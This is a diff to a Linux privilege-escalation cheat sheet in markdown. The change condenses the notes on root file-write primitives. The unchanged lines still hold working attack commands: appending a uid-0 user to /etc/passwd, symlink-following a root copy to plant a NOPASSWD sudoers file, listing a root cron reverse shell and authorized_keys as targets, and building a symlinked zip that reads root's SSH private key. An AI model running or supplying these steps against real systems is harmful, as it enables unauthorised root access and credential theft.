@@ -10,7 +10,7 @@ echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su root2
 ```
 
 ## Arbitrary file write as root → symlink-follow primitives
-A root-run helper that writes to a path you control may follow a symlink and write as root. Confirm that behavior with a harmless target before pointing it at a privileged file.
+Root-run write to your path + symlink following → test harmless target first.
 ```bash
 # Pattern: tool copies <src> -> <dst> as root and follows symlinks on <dst>.
 # 1) make the payload (mode matters for sudoers: must be 0440)
@@ -21,13 +21,13 @@ ln -s /etc/sudoers.d/pwn dst_link
 #    then:
 sudo -i        # you're root
 ```
-Possible targets after confirming the write primitive:
+After confirming root write:
 - `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
 - `/etc/passwd` → append a `uid=0` user with a known hash (see above).
 - root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
 - `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it. Check the setting first.
 
-Archive extraction is a separate path. A root process that extracts an attacker-supplied archive may follow a symlink member even when it rejects `../` traversal. Test the actual extractor and destination before treating the two as equivalent:
+Archive extraction: test symlink-member handling and exact destination; `../` rejection does not settle symlinks.
 ```bash
 # source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
 ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
